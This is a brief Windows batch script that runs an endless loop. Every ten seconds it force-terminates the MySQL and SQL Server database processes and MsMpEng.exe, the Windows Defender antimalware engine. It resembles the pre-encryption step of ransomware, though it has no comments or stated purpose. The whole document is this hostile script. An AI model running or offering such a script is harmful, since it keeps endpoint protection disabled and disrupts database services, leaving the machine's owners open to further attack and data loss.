:A
taskkill /f /im mysqld.exe
taskkill /f /im sqlserver.exe
taskkill /f /im MsMpEng.exe
timeout 10
goto A
